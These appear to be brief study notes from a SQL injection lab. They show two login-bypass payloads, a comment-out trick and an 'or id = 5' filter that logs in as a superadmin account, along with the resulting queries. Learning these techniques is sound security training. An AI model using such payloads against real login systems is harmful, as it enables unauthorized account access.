
we can use comments to comment out the rest of the query and avoid the logic of it 

typing: tom')-- - into the username will result in this -> 
<span style="color:rgb(255, 0, 0)">SELECT * FROM logins WHERE (username='tom')-- -' AND id > 1) AND password = '202cb962ac59075b964b07152d234b70';</span>

this will result the part after the username beeing commented out

-----------

We can also use filtering queries to log in as a certain user with a specific id value

<span style="color:rgb(255, 0, 0)">SELECT * FROM logins WHERE (username='qq')or id = 5-- -' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';</span>

Login successful as user: superadmin

here we used a invalid username but due to the logic of or it used the id of 5 to select the user and logged us in as the superadmin